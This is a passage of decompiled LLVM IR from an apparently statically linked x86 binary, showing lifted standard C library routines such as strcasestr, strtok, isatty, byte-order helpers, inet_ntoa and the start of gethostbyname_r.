  %v0_804fa03 = phi i32 [ %arg2, %entry ], [ %v1_804fa03, %dec_label_pc_804fa03 ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804f9e6 = icmp eq i32 %v0_804fa04, %v0_804fa03
  %.pre = inttoptr i32 %v0_804fa04 to i8*
  br i1 %v12_804f9e6, label %dec_label_pc_804f9fe, label %dec_label_pc_804f9ea

dec_label_pc_804f9ea:                             ; preds = %dec_label_pc_804f9e6
  %v2_804f9ea = load i8, i8* %.pre, align 1
  %v3_804f9ea = zext i8 %v2_804f9ea to i32
  %v2_804f9ed = mul nuw nsw i32 %v3_804f9ea, 2
  %v3_804f9ed = add i32 %v2_804f9ed, %v0_804f9d5
  %v4_804f9ed = inttoptr i32 %v3_804f9ed to i16*
  %v5_804f9ed = load i16, i16* %v4_804f9ed, align 2
  %v6_804f9ed = sext i16 %v5_804f9ed to i32
  %v1_804f9f1 = inttoptr i32 %v0_804fa03 to i8*
  %v2_804f9f1 = load i8, i8* %v1_804f9f1, align 1
  %v3_804f9f1 = zext i8 %v2_804f9f1 to i32
  %v2_804f9f4 = mul nuw nsw i32 %v3_804f9f1, 2
  %v3_804f9f4 = add i32 %v2_804f9f4, %v0_804f9d5
  %v4_804f9f4 = inttoptr i32 %v3_804f9f4 to i16*
  %v5_804f9f4 = load i16, i16* %v4_804f9f4, align 2
  %v6_804f9f4 = sext i16 %v5_804f9f4 to i32
  %v2_804f9f8 = sub nsw i32 %v6_804f9ed, %v6_804f9f4
  %v12_804f9f8 = icmp eq i32 %v2_804f9f8, 0
  store i32 %v2_804f9f8, i32* @edx, align 4
  %v1_804f9fc = icmp eq i1 %v12_804f9f8, false
  br i1 %v1_804f9fc, label %dec_label_pc_804fa07, label %dec_label_pc_804f9fe

dec_label_pc_804f9fe:                             ; preds = %dec_label_pc_804f9e6, %dec_label_pc_804f9ea
  %v0_804fa097 = phi i32 [ %v2_804f9f8, %dec_label_pc_804f9ea ], [ %v0_804fa096, %dec_label_pc_804f9e6 ]
  %v2_804f9fe = load i8, i8* %.pre, align 1
  %v3_804f9fe = icmp eq i8 %v2_804f9fe, 0
  br i1 %v3_804f9fe, label %dec_label_pc_804fa07, label %dec_label_pc_804fa03

dec_label_pc_804fa03:                             ; preds = %dec_label_pc_804f9fe
  %v1_804fa03 = add i32 %v0_804fa03, 1
  %v1_804fa04 = add i32 %v0_804fa04, 1
  br label %dec_label_pc_804f9e6

dec_label_pc_804fa07:                             ; preds = %dec_label_pc_804f9fe, %dec_label_pc_804f9ea
  %v0_804fa09 = phi i32 [ %v0_804fa097, %dec_label_pc_804f9fe ], [ %v2_804f9f8, %dec_label_pc_804f9ea ]
  ret i32 %v0_804fa09

; uselistorder directives
  uselistorder i32 %v1_804fa04, { 1, 0 }
  uselistorder i32 %v0_804fa097, { 1, 0 }
  uselistorder i32 %v2_804f9f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804fa03, { 1, 2, 0 }
  uselistorder i32 %v0_804fa04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9fe, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804fa0f = load i32, i32* @ebx, align 4
  %v4_804fa13 = ptrtoint i8* %arg1 to i32
  %v1_804fa1f18 = inttoptr i32 %arg2 to i8*
  %v2_804fa1f1932 = load i8, i8* %v1_804fa1f18, align 1
  %v4_804fa212336 = icmp eq i8 %v2_804fa1f1932, 0
  %v1_804fa232538 = icmp eq i1 %v4_804fa212336, false
  br i1 %v1_804fa232538, label %dec_label_pc_804fa29.lr.ph.lr.ph, label %dec_label_pc_804fa59

dec_label_pc_804fa29.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804fa1f2033 = zext i8 %v2_804fa1f1932 to i32
  %v4_804fa1f.pre.pre = load i32, i32* @eax, align 4
  %v5_804fa1f2134 = and i32 %v4_804fa1f.pre.pre, -256
  %v6_804fa1f2235 = or i32 %v3_804fa1f2033, %v5_804fa1f2134
  %v4_804fa29.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fa29.lr.ph

dec_label_pc_804fa29.lr.ph:                       ; preds = %dec_label_pc_804fa29.lr.ph.lr.ph, %dec_label_pc_804fa54
  %v4_804fa29.pre = phi i32 [ %v4_804fa29.pre.pre, %dec_label_pc_804fa29.lr.ph.lr.ph ], [ %v0_804fa33, %dec_label_pc_804fa54 ]
  %v6_804fa1f2241 = phi i32 [ %v6_804fa1f2235, %dec_label_pc_804fa29.lr.ph.lr.ph ], [ %v6_804fa1f22, %dec_label_pc_804fa54 ]
  %v2_804fa1f1940 = phi i8 [ %v2_804fa1f1932, %dec_label_pc_804fa29.lr.ph.lr.ph ], [ %v2_804fa1f19, %dec_label_pc_804fa54 ]
  %v0_804fa5439 = phi i32 [ %v4_804fa13, %dec_label_pc_804fa29.lr.ph.lr.ph ], [ %v1_804fa54, %dec_label_pc_804fa54 ]
  br label %dec_label_pc_804fa29

dec_label_pc_804fa29:                             ; preds = %dec_label_pc_804fa29.lr.ph, %dec_label_pc_804fa49
  %v4_804fa29 = phi i32 [ %v4_804fa29.pre, %dec_label_pc_804fa29.lr.ph ], [ %v4_804fa2946, %dec_label_pc_804fa49 ]
  %v6_804fa1f30 = phi i32 [ %v6_804fa1f2241, %dec_label_pc_804fa29.lr.ph ], [ %v6_804fa1f, %dec_label_pc_804fa49 ]
  %v2_804fa1f29 = phi i8 [ %v2_804fa1f1940, %dec_label_pc_804fa29.lr.ph ], [ %v2_804fa1f, %dec_label_pc_804fa49 ]
  %v1_804fa1f28 = phi i8* [ %v1_804fa1f18, %dec_label_pc_804fa29.lr.ph ], [ %v1_804fa1f, %dec_label_pc_804fa49 ]
  %v0_804fa4927 = phi i32 [ %arg2, %dec_label_pc_804fa29.lr.ph ], [ %v1_804fa49, %dec_label_pc_804fa49 ]
  %v0_804fa4a26 = phi i32 [ %v0_804fa5439, %dec_label_pc_804fa29.lr.ph ], [ %v1_804fa4a, %dec_label_pc_804fa49 ]
  %v1_804fa29 = inttoptr i32 %v0_804fa4a26 to i8*
  %v2_804fa29 = load i8, i8* %v1_804fa29, align 1
  %v3_804fa29 = zext i8 %v2_804fa29 to i32
  %v5_804fa29 = and i32 %v4_804fa29, -256
  %v6_804fa29 = or i32 %v5_804fa29, %v3_804fa29
  %v15_804fa2b = icmp eq i8 %v2_804fa1f29, %v2_804fa29
  br i1 %v15_804fa2b, label %dec_label_pc_804fa49, label %dec_label_pc_804fa33

dec_label_pc_804fa33:                             ; preds = %dec_label_pc_804fa29
  %v0_804fa33 = load i32, i32* bitcast (i32** @global_var_805a040.178 to i32*), align 64
  %v2_804fa39 = load i8, i8* %v1_804fa29, align 1
  %v3_804fa39 = zext i8 %v2_804fa39 to i32
  %v2_804fa3c = load i8, i8* %v1_804fa1f28, align 1
  %v3_804fa3c = zext i8 %v2_804fa3c to i32
  %v2_804fa3f = mul nuw nsw i32 %v3_804fa39, 2
  %v3_804fa3f = add i32 %v2_804fa3f, %v0_804fa33
  %v4_804fa3f = inttoptr i32 %v3_804fa3f to i16*
  %v5_804fa3f = load i16, i16* %v4_804fa3f, align 2
  %v6_804fa3f = zext i16 %v5_804fa3f to i32
  %v4_804fa43 = mul nuw nsw i32 %v3_804fa3c, 2
  %v5_804fa43 = add i32 %v4_804fa43, %v0_804fa33
  %v6_804fa43 = inttoptr i32 %v5_804fa43 to i16*
  %v7_804fa43 = load i16, i16* %v6_804fa43, align 2
  %v18_804fa43 = icmp eq i16 %v5_804fa3f, %v7_804fa43
  %v1_804fa47 = icmp eq i1 %v18_804fa43, false
  br i1 %v1_804fa47, label %dec_label_pc_804fa4d, label %dec_label_pc_804fa49

dec_label_pc_804fa49:                             ; preds = %dec_label_pc_804fa33, %dec_label_pc_804fa29
  %v4_804fa2946 = phi i32 [ %v0_804fa33, %dec_label_pc_804fa33 ], [ %v6_804fa29, %dec_label_pc_804fa29 ]
  %v4_804fa1f6 = phi i32 [ %v6_804fa3f, %dec_label_pc_804fa33 ], [ %v6_804fa1f30, %dec_label_pc_804fa29 ]
  %v1_804fa49 = add i32 %v0_804fa4927, 1
  %v1_804fa4a = add i32 %v0_804fa4a26, 1
  %v1_804fa1f = inttoptr i32 %v1_804fa49 to i8*
  %v2_804fa1f = load i8, i8* %v1_804fa1f, align 1
  %v3_804fa1f = zext i8 %v2_804fa1f to i32
  %v5_804fa1f = and i32 %v4_804fa1f6, -256
  %v6_804fa1f = or i32 %v3_804fa1f, %v5_804fa1f
  %v4_804fa21 = icmp eq i8 %v2_804fa1f, 0
  %v1_804fa23 = icmp eq i1 %v4_804fa21, false
  br i1 %v1_804fa23, label %dec_label_pc_804fa29, label %dec_label_pc_804fa59

dec_label_pc_804fa4d:                             ; preds = %dec_label_pc_804fa33
  %v4_804fa4d = icmp eq i8 %v2_804fa29, 0
  br i1 %v4_804fa4d, label %dec_label_pc_804fa57, label %dec_label_pc_804fa54

dec_label_pc_804fa54:                             ; preds = %dec_label_pc_804fa4d
  %v1_804fa54 = add i32 %v0_804fa5439, 1
  %v2_804fa1f19 = load i8, i8* %v1_804fa1f18, align 1
  %v3_804fa1f20 = zext i8 %v2_804fa1f19 to i32
  %v5_804fa1f21 = and i32 %v6_804fa3f, 65280
  %v6_804fa1f22 = or i32 %v3_804fa1f20, %v5_804fa1f21
  %v4_804fa2123 = icmp eq i8 %v2_804fa1f19, 0
  %v1_804fa2325 = icmp eq i1 %v4_804fa2123, false
  br i1 %v1_804fa2325, label %dec_label_pc_804fa29.lr.ph, label %dec_label_pc_804fa59

dec_label_pc_804fa57:                             ; preds = %dec_label_pc_804fa4d
  br label %dec_label_pc_804fa59

dec_label_pc_804fa59:                             ; preds = %dec_label_pc_804fa54, %entry, %dec_label_pc_804fa49, %dec_label_pc_804fa57
  %storemerge = phi i32 [ 0, %dec_label_pc_804fa57 ], [ %v4_804fa13, %entry ], [ %v1_804fa54, %dec_label_pc_804fa54 ], [ %v0_804fa5439, %dec_label_pc_804fa49 ]
  store i32 %v0_804fa0f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804fa1f19, { 1, 2, 0 }
  uselistorder i8 %v2_804fa1f, { 1, 2, 0 }
  uselistorder i8* %v1_804fa1f, { 1, 0 }
  uselistorder i32 %v0_804fa33, { 1, 2, 3, 0 }
  uselistorder i8 %v2_804fa29, { 1, 0, 2 }
  uselistorder i32 %v0_804fa4a26, { 1, 0 }
  uselistorder i8 %v2_804fa1f1932, { 0, 2, 1 }
  uselistorder i8* %v1_804fa1f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fa59, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa29, { 1, 0 }
  uselistorder label %dec_label_pc_804fa29.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804fa70 = inttoptr i32 %arg1 to i8*
  %v4_804fa70 = call i32 @strtok_r(i8* %v3_804fa70, i32 %arg2, i32 ptrtoint (i32* @global_var_80600c0.179 to i32))
  ret i32 %v4_804fa70
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804fa88 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804fa8d = icmp eq i32 %v3_804fa88, 0
  %v1_804fa8f = zext i1 %v1_804fa8d to i32
  ret i32 %v1_804fa8f
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fa9c = load i32, i32* @esi, align 4
  %v0_804fa9d = load i32, i32* @ebx, align 4
  store i32 %v0_804fa9d, i32* %stack_var_-8, align 4
  %v2_804faa1 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804faa1, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804fab3 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804faa1)
  store i32 %v3_804fab3, i32* %eax.global-to-local, align 4
  %v1_804fabb = icmp eq i32 %v3_804fab3, 0
  store i32 %v3_804fab3, i32* @esi, align 4
  %v1_804fabf = icmp eq i1 %v1_804fabb, false
  br i1 %v1_804fabf, label %dec_label_pc_804fb04, label %dec_label_pc_804fac1

dec_label_pc_804fac1:                             ; preds = %entry
  %v3_804fac1 = load i32, i32* %stack_var_-44, align 4
  %v1_804fac5 = load i32, i32* @ebx, align 4
  %v2_804fac5 = inttoptr i32 %v1_804fac5 to i32*
  store i32 %v3_804fac1, i32* %v2_804fac5, align 4
  %v1_804facb = load i32, i32* @ebx, align 4
  %v2_804facb = add i32 %v1_804facb, 4
  %v3_804facb = inttoptr i32 %v2_804facb to i32*
  %v1_804fad2 = load i32, i32* @ebx, align 4
  %v2_804fad2 = add i32 %v1_804fad2, 8
  %v3_804fad2 = inttoptr i32 %v2_804fad2 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804fad9 = load i32, i32* @ebx, align 4
  %v2_804fad9 = add i32 %v1_804fad9, 12
  %v3_804fad9 = inttoptr i32 %v2_804fad9 to i32*
  store i32 %tmp3, i32* %v3_804fad9, align 4
  %v4_804fadc = zext i8 %tmp to i32
  %v5_804fadc = load i32, i32* %eax.global-to-local, align 4
  %v6_804fadc = and i32 %v5_804fadc, -256
  %v7_804fadc = or i32 %v6_804fadc, %v4_804fadc
  store i32 %v7_804fadc, i32* %eax.global-to-local, align 4
  %v2_804fae0 = load i32, i32* @ebx, align 4
  %v3_804fae0 = add i32 %v2_804fae0, 16
  %v4_804fae0 = inttoptr i32 %v3_804fae0 to i8*
  store i8 %tmp, i8* %v4_804fae0, align 1
  %v0_804fae3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fae6 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804faeb = load i32, i32* @ebx, align 4
  %v1_804faeb = add i32 %v0_804faeb, 17
  store i32 %v1_804faeb, i32* %eax.global-to-local, align 4
  %v4_804faef = call i32 @__GI_mempcpy(i32 %v1_804faeb, i32 %v2_804fae6, i32 19, i32 %v0_804fae3)
  store i32 %v4_804faef, i32* %eax.global-to-local, align 4
  %v3_804fafc = inttoptr i32 %v4_804faef to i8*
  %v4_804fafc = call i32 @__GI_memset(i8* %v3_804fafc, i32 0, i32 13)
  store i32 %v4_804fafc, i32* %eax.global-to-local, align 4
  %v0_804fb07.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fb04

dec_label_pc_804fb04:                             ; preds = %entry, %dec_label_pc_804fac1
  %v0_804fb07 = phi i32 [ %v3_804fab3, %entry ], [ %v0_804fb07.pre, %dec_label_pc_804fac1 ]
  store i32 %v0_804fb07, i32* %eax.global-to-local, align 4
  %v2_804fb09 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fb09, i32* @ebx, align 4
  store i32 %v0_804fa9c, i32* @esi, align 4
  ret i32 %v0_804fb07

; uselistorder directives
  uselistorder i32 %v0_804fb07, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb04, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fb11 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fb11 = zext i16 %v3_804fb11 to i32
  ret i32 %v4_804fb11
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804fb1d = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804fb1d
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804fb25 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804fb25 = zext i16 %v3_804fb25 to i32
  ret i32 %v4_804fb25
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804fb31 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804fb31
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fb34 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804fb37 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804fb3a = load i32, i32* @ebx, align 4
  store i32 %v0_804fb3a, i32* %stack_var_-12, align 4
  %v1_804fb43 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804fb43, 16777216
  %v1_804fb45 = sdiv i32 %sext, 16777216
  store i32 %v1_804fb45, i32* @ebx, align 4
  %v1_804fb47 = add i32 %arg2, 15
  store i32 %v1_804fb47, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fb4c

dec_label_pc_804fb4c:                             ; preds = %entry, %dec_label_pc_804fb71
  %v0_804fb5317 = phi i32 [ %v1_804fb45, %entry ], [ %v2_804fb71, %dec_label_pc_804fb71 ]
  %v0_804fb7d16 = phi i32 [ %v1_804fb47, %entry ], [ %v0_804fb75, %dec_label_pc_804fb71 ]
  %v1_804fb57 = urem i32 %v0_804fb5317, 256
  %v5_804fb5f = inttoptr i32 %v0_804fb7d16 to i8*
  %v6_804fb5f = call i32 @_uintmaxtostr(i8* %v5_804fb5f, i32 %v1_804fb57, i32 0, i32 -10, i32 0)
  %v0_804fb67 = load i32, i32* @esi, align 4
  %v1_804fb67 = icmp eq i32 %v0_804fb67, 0
  %v1_804fb69 = add i32 %v6_804fb5f, -1
  store i32 %v1_804fb69, i32* %ecx.global-to-local, align 4
  br i1 %v1_804fb67, label %dec_label_pc_804fb71, label %dec_label_pc_804fb6e

dec_label_pc_804fb6e:                             ; preds = %dec_label_pc_804fb4c
  %v1_804fb6e = inttoptr i32 %v0_804fb67 to i8*
  store i8 46, i8* %v1_804fb6e, align 1
  %v0_804fb75.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fb71

dec_label_pc_804fb71:                             ; preds = %dec_label_pc_804fb4c, %dec_label_pc_804fb6e
  %v0_804fb75 = phi i32 [ %v1_804fb69, %dec_label_pc_804fb4c ], [ %v0_804fb75.pre, %dec_label_pc_804fb6e ]
  %v0_804fb71 = load i32, i32* @ebx, align 4
  %v2_804fb71 = udiv i32 %v0_804fb71, 256
  store i32 %v2_804fb71, i32* @ebx, align 4
  %v0_804fb74 = load i32, i32* @edi, align 4
  %v1_804fb74 = add i32 %v0_804fb74, 1
  store i32 %v1_804fb74, i32* @edi, align 4
  store i32 %v0_804fb75, i32* @esi, align 4
  %v7_804fb7a = icmp sgt i32 %v1_804fb74, 3
  br i1 %v7_804fb7a, label %dec_label_pc_804fb7c, label %dec_label_pc_804fb4c

dec_label_pc_804fb7c:                             ; preds = %dec_label_pc_804fb71
  %v2_804fb7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb7c, i32* @ebx, align 4
  %v1_804fb7d = add i32 %v0_804fb75, 1
  store i32 %v0_804fb37, i32* @esi, align 4
  store i32 %v0_804fb34, i32* @edi, align 4
  ret i32 %v1_804fb7d

; uselistorder directives
  uselistorder i32 %v0_804fb75, { 0, 2, 1 }
  uselistorder i32 %v1_804fb45, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb71, { 1, 0 }
  uselistorder label %dec_label_pc_804fb4c, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804fb8f = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80600c4.180 to i32))
  ret i32 %v2_804fb8f
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804fb9b = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fba4 = inttoptr i32 %arg1 to i8*
  %v3_804fba4 = call i32 @inet_aton(i8* %v2_804fba4, i32 %v2_804fb9b)
  %v1_804fbaf = icmp eq i32 %v3_804fba4, 0
  br i1 %v1_804fbaf, label %dec_label_pc_804fbb7, label %dec_label_pc_804fbb3

dec_label_pc_804fbb3:                             ; preds = %entry
  %v3_804fbb3 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbb7

dec_label_pc_804fbb7:                             ; preds = %entry, %dec_label_pc_804fbb3
  %v0_804fbb7 = phi i32 [ -1, %entry ], [ %v3_804fbb3, %dec_label_pc_804fbb3 ]
  ret i32 %v0_804fbb7

; uselistorder directives
  uselistorder label %dec_label_pc_804fbb7, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbc3 = call i32 @__GI___h_errno_location()
  %v0_804fbc8 = load i32, i32* @edx, align 4
  %v2_804fbcb = ptrtoint i32* %stack_var_-4 to i32
  %v9_804fbe3 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80602ac.182, i32 ptrtoint (i32* @global_var_80600e0.181 to i32), i32 460, i32 %v2_804fbcb, i32 %v0_804fbc3, i32 %v0_804fbc8, i32 %v0_804fbc8)
  %v3_804fbe8 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804fbe8
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804fbf0 = load i32, i32* @ebp, align 4
  %v0_804fbf1 = load i32, i32* @edi, align 4
  %v0_804fbf2 = load i32, i32* @esi, align 4
  %v0_804fbf3 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804fc03 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804fc03, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804fc0e = icmp eq i32 %arg1, 0
  br i1 %v4_804fc0e, label %dec_label_pc_804ff1a, label %dec_label_pc_804fc19

dec_label_pc_804fc19:                             ; preds = %entry
  %v1_804fc19 = call i32 @__errno_location(i32 %v0_804fbf3)
  store i32 %v1_804fc19, i32* %eax.global-to-local, align 4
  %v1_804fc1e = inttoptr i32 %v1_804fc19 to i32*
  %v2_804fc1e = load i32, i32* %v1_804fc1e, align 4
  store i32 %v2_804fc1e, i32* @edi, align 4
  store i32 %v1_804fc19, i32* @esi, align 4
  store i32 0, i32* %v1_804fc1e, align 4
  %v0_804fc31 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc31, i32* %stack_var_-108, align 4
  %v7_804fc3d = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804fc31, i32 %arg5, i32 %arg6, i32 %v1_804fc19)
  store i32 %v7_804fc3d, i32* %eax.global-to-local, align 4
  %v1_804fc45 = icmp eq i32 %v7_804fc3d, 0
  br i1 %v1_804fc45, label %dec_label_pc_804ff1a, label %dec_label_pc_804fc4d

dec_label_pc_804fc4d:                             ; preds = %dec_label_pc_804fc19
  %v1_804fc51 = inttoptr i32 %arg6 to i32*
  %v2_804fc51 = load i32, i32* %v1_804fc51, align 4
  store i32 %v2_804fc51, i32* %edx.global-to-local, align 4
  %v9_804fc53 = icmp eq i32 %v2_804fc51, 1
  br i1 %v9_804fc53, label %dec_label_pc_804fc6d, label %dec_label_pc_804fc58

dec_label_pc_804fc58:                             ; preds = %dec_label_pc_804fc4d
  %v9_804fc58 = icmp eq i32 %v2_804fc51, 4
  br i1 %v9_804fc58, label %dec_label_pc_804fc6d, label %dec_label_pc_804fc5d

dec_label_pc_804fc5d:                             ; preds = %dec_label_pc_804fc58
  %v1_804fc5d = add i32 %v2_804fc51, 1
  %v8_804fc5d = icmp eq i32 %v1_804fc5d, 0
  store i32 %v1_804fc5d, i32* %edx.global-to-local, align 4
  %v1_804fc5e = icmp eq i1 %v8_804fc5d, false
  br i1 %v1_804fc5e, label %dec_label_pc_804ff1a, label %dec_label_pc_804fc64

dec_label_pc_804fc64:                             ; preds = %dec_label_pc_804fc5d
  %v0_804fc64 = load i32, i32* @esi, align 4
  %v1_804fc64 = inttoptr i32 %v0_804fc64 to i32*
  %v2_804fc64 = load i32, i32* %v1_804fc64, align 4
  %v11_804fc64 = icmp eq i32 %v2_804fc64, 2
  %v1_804fc67 = icmp eq i1 %v11_804fc64, false
  br i1 %v1_804fc67, label %dec_label_pc_804ff1a, label %dec_label_pc_804fc6d

dec_label_pc_804fc6d:                             ; preds = %dec_label_pc_804fc64, %dec_label_pc_804fc58, %dec_label_pc_804fc4d
  %v0_804fc6d = load i32, i32* @ebp, align 4
  %v1_804fc6f = sub i32 0, %v0_804fc6d
  %v1_804fc71 = urem i32 %v1_804fc6f, 4
  %v2_804fc71 = icmp eq i32 %v1_804fc71, 0
  store i32 %v1_804fc71, i32* %eax.global-to-local, align 4
  %v0_804fc74 = load i32, i32* @edi, align 4
  %v1_804fc74 = load i32, i32* @esi, align 4
  %v2_804fc74 = inttoptr i32 %v1_804fc74 to i32*
  store i32 %v0_804fc74, i32* %v2_804fc74, align 4
  %v0_804fc88.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804fc71, label %dec_label_pc_804fc84, label %dec_label_pc_804fc78

dec_label_pc_804fc78:                             ; preds = %dec_label_pc_804fc6d
  %v1_804fc78 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fc78 = sub i32 %v0_804fc88.pre, %v1_804fc78
  %v7_804fc78 = icmp ult i32 %v0_804fc88.pre, %v1_804fc78
  br i1 %v7_804fc78, label %dec_label_pc_804ff15, label %dec_label_pc_804fc80

dec_label_pc_804fc80:                             ; preds = %dec_label_pc_804fc78
  %v0_804fc80 = load i32, i32* @ebp, align 4
  %v2_804fc80 = add i32 %v0_804fc80, %v1_804fc78
  store i32 %v2_804fc80, i32* @ebp, align 4
  store i32 %v2_804fc78, i32* @ebx, align 4
  br label %dec_label_pc_804fc84

dec_label_pc_804fc84:                             ; preds = %dec_label_pc_804fc6d, %dec_label_pc_804fc80
  %v0_804fc88 = phi i32 [ %v2_804fc78, %dec_label_pc_804fc80 ], [ %v0_804fc88.pre, %dec_label_pc_804fc6d ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804fc51, align 4
  %tmp41 = icmp ult i32 %v0_804fc88, 4
  br i1 %tmp41, label %dec_label_pc_804ff15, label %dec_label_pc_804fc97

dec_label_pc_804fc97:                             ; preds = %dec_label_pc_804fc84
  %v0_804fc97 = load i32, i32* @ebx, align 4
  %v1_804fc97 = add i32 %v0_804fc97, -4
  store i32 %v1_804fc97, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804fc97, 8
  br i1 %tmp42, label %dec_label_pc_804ff15, label %dec_label_pc_804fca3

dec_label_pc_804fca3:                             ; preds = %dec_label_pc_804fc97
  %v1_804fca3 = add i32 %v0_804fc97, -12
  store i32 %v1_804fca3, i32* %eax.global-to-local, align 4
  %v0_804fca6 = load i32, i32* @ebp, align 4
  %v1_804fca6 = add i32 %v0_804fca6, 4
  store i32 %v1_804fca6, i32* %edx.global-to-local, align 4
  store i32 %v1_804fca6, i32* %stack_var_-92, align 4
  %v3_804fcaf = inttoptr i32 %v1_804fca6 to i32*
  store i32 %v0_804fca6, i32* %v3_804fcaf, align 4
  %v0_804fcb2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fcb2 = add i32 %v0_804fcb2, 4
  %v2_804fcb2 = inttoptr i32 %v1_804fcb2 to i32*
  store i32 0, i32* %v2_804fcb2, align 4
  %tmp43 = icmp ult i32 %v1_804fca3, 32
  br i1 %tmp43, label %dec_label_pc_804ff15, label %dec_label_pc_804fcbf

dec_label_pc_804fcbf:                             ; preds = %dec_label_pc_804fca3
  %v0_804fcbf = load i32, i32* @ebx, align 4
  %v1_804fcbf = add i32 %v0_804fcbf, -44
  store i32 %v1_804fcbf, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804fcbf, 256
  br i1 %tmp44, label %dec_label_pc_804ff15, label %dec_label_pc_804fcd2

dec_label_pc_804fcd2:                             ; preds = %dec_label_pc_804fcbf
  %v0_804fcd2 = load i32, i32* @ebp, align 4
  %v1_804fcd2 = add i32 %v0_804fcd2, 12
  %v1_804fcd9 = add i32 %v0_804fcd2, 44
  store i32 %v1_804fcd9, i32* @edi, align 4
  store i32 %v1_804fcd9, i32* %stack_var_-108, align 4
  %v3_804fce6 = inttoptr i32 %v1_804fcd9 to i8*
  %v4_804fce6 = call i32 @strncpy(i8* %v3_804fce6, i32 %arg1, i32 %v1_804fcbf)
